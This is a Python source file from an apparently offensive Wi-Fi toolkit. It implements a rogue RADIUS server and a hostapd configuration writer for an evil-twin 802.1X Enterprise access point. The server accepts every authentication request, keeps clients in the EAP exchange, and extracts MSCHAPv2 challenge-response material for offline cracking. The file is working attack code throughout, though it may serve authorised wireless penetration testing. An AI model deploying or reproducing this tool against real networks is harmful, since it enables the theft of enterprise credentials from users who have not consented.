"""
Pure-Python Rogue RADIUS / EvilAP for 802.1X Enterprise capture.

Spins up a UDP RADIUS server on 127.0.0.1:1812 that accepts any Access-Request,
strips EAP payloads, and feeds them to EapCapture for MSCHAPv2 extraction.

The companion fake AP (hostapd config writer) configures hostapd to point its
auth_server_addr at this local RADIUS instance so the tool is self-contained.

Architecture:
  FakeAP (hostapd config) → hostapd → RADIUS UDP → RogueRadiusServer
                                                        ↓ EapCapture
                                                        ↓ MSCHAPv2Crackable
                                                        ↓ on_capture callback
"""
from __future__ import annotations

import asyncio
import hashlib
import logging
import os
import struct
import tempfile
from pathlib import Path
from typing import Callable

from .eap_capture import EapCapture, MSCHAPv2Crackable

log = logging.getLogger("wifit4.enterprise")

# RADIUS packet format: code(1) id(1) length(2) authenticator(16) attrs(...)
_RADIUS_HDR = struct.Struct("!BBH16s")
_RADIUS_CODE_ACCESS_REQUEST  = 1
_RADIUS_CODE_ACCESS_ACCEPT   = 2
_RADIUS_CODE_ACCESS_REJECT   = 3
_RADIUS_CODE_ACCESS_CHALLENGE = 11

_ATTR_USER_NAME  = 1
_ATTR_EAP_MSG    = 79
_ATTR_STATE      = 24
_ATTR_MSG_AUTH   = 80

_DEFAULT_SECRET = b"wifit4_rogue_secret"


class RogueRadiusServer:
    """
    Async UDP RADIUS server.  Always issues Access-Challenge to keep the EAP
    exchange going, extracts EAP payloads, and hands them to EapCapture.
    """

    def __init__(
        self,
        on_capture: Callable[[MSCHAPv2Crackable], None],
        host: str = "127.0.0.1",
        port: int = 1812,
        secret: bytes = _DEFAULT_SECRET,
    ) -> None:
        self._host = host
        self._port = port
        self._secret = secret
        self._eap_capture = EapCapture(on_capture)
        self._transport: asyncio.DatagramTransport | None = None
        self._server: asyncio.DatagramProtocol | None = None
        self._eap_id_counter = 0
        self._state_map: dict[str, bytes] = {}  # client_mac -> RADIUS State attr

    async def start(self) -> None:
        loop = asyncio.get_running_loop()
        self._transport, self._server = await loop.create_datagram_endpoint(
            lambda: _RadiusProtocol(self._handle_packet),
            local_addr=(self._host, self._port),
        )
        log.info("Rogue RADIUS listening on %s:%d", self._host, self._port)

    def stop(self) -> None:
        if self._transport:
            self._transport.close()
            log.info("Rogue RADIUS stopped.")

    def _handle_packet(
        self,
        data: bytes,
        addr: tuple[str, int],
        send: Callable[[bytes], None],
    ) -> None:
        if len(data) < 20:
            return
        code, pkt_id, length, authenticator = _RADIUS_HDR.unpack_from(data)
        if code != _RADIUS_CODE_ACCESS_REQUEST:
            return

        attrs = _parse_attrs(data[20:])
        eap_msg = attrs.get(_ATTR_EAP_MSG, b"")
        username_bytes = attrs.get(_ATTR_USER_NAME, b"")
        username = username_bytes.decode(errors="replace")
        client_key = f"{addr[0]}:{username}"

        if eap_msg:
            # Feed raw EAP (prepend fake EAPOL header: ver=1 type=0 len=len(eap_msg))
            eapol = bytes([1, 0]) + struct.pack("!H", len(eap_msg)) + eap_msg
            self._eap_capture.feed_eapol(client_key, eapol)

        # Always respond with Access-Challenge to keep exchange alive
        state = self._state_map.setdefault(client_key, os.urandom(16))
        response = _build_access_challenge(
            pkt_id, authenticator, state, self._secret, self._eap_id_counter
        )
        self._eap_id_counter = (self._eap_id_counter + 1) % 256
        send(response)

    def hostapd_config(self, ssid: str, interface: str, channel: int = 6) -> str:
        """Generate hostapd.conf string pointing auth to this RADIUS server."""
        return (
            f"interface={interface}\n"
            f"ssid={ssid}\n"
            f"channel={channel}\n"
            f"hw_mode=g\n"
            f"ieee8021x=1\n"
            f"eap_server=0\n"
            f"auth_server_addr={self._host}\n"
            f"auth_server_port={self._port}\n"
            f"auth_server_shared_secret={self._secret.decode()}\n"
            f"wpa=2\n"
            f"wpa_key_mgmt=WPA-EAP\n"
            f"rsn_pairwise=CCMP\n"
        )

    def write_hostapd_config(self, ssid: str, interface: str, channel: int = 6) -> Path:
        conf = self.hostapd_config(ssid, interface, channel)
        path = Path(tempfile.mktemp(suffix="_wifit4_hostapd.conf"))
        path.write_text(conf)
        return path


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _parse_attrs(data: bytes) -> dict[int, bytes]:
    attrs: dict[int, bytes] = {}
    pos = 0
    while pos + 2 <= len(data):
        attr_type = data[pos]
        attr_len  = data[pos + 1]
        if attr_len < 2 or pos + attr_len > len(data):
            break
        value = data[pos + 2 : pos + attr_len]
        if attr_type in (_ATTR_EAP_MSG,):
            attrs[attr_type] = attrs.get(attr_type, b"") + value
        else:
            attrs[attr_type] = value
        pos += attr_len
    return attrs


def _build_access_challenge(
    req_id: int,
    req_authenticator: bytes,
    state: bytes,
    secret: bytes,
    eap_id: int,
) -> bytes:
    # EAP-Request/Identity to keep the exchange alive
    eap_req = bytes([1, eap_id, 0, 5, 1])  # code=1 id=eap_id len=5 type=Identity
    eap_attr    = _encode_attr(_ATTR_EAP_MSG, eap_req)
    state_attr  = _encode_attr(_ATTR_STATE, state)
    body = eap_attr + state_attr
    length = 20 + len(body)
    # Placeholder Message-Authenticator (16 zero bytes - clients rarely verify on challenge)
    msg_auth = _encode_attr(_ATTR_MSG_AUTH, b"\x00" * 16)
    length += len(msg_auth)
    hdr = struct.pack(
        "!BBH16s",
        _RADIUS_CODE_ACCESS_CHALLENGE,
        req_id,
        length,
        b"\x00" * 16,  # response authenticator placeholder
    )
    pkt = hdr + body + msg_auth
    # Compute Response Authenticator = MD5(code+id+length+req_auth+attrs+secret)
    resp_auth = hashlib.md5(pkt[:4] + req_authenticator + pkt[20:] + secret).digest()
    return pkt[:4] + resp_auth + pkt[20:]


def _encode_attr(attr_type: int, value: bytes) -> bytes:
    length = 2 + len(value)
    return bytes([attr_type, length]) + value


class _RadiusProtocol(asyncio.DatagramProtocol):
    def __init__(self, handler: Callable) -> None:
        self._handler = handler
        self._transport: asyncio.DatagramTransport | None = None

    def connection_made(self, transport: asyncio.DatagramTransport) -> None:
        self._transport = transport

    def datagram_received(self, data: bytes, addr: tuple) -> None:
        self._handler(data, addr, lambda pkt: self._transport.sendto(pkt, addr))

    def error_received(self, exc: Exception) -> None:
        log.debug("RADIUS UDP error: %s", exc)
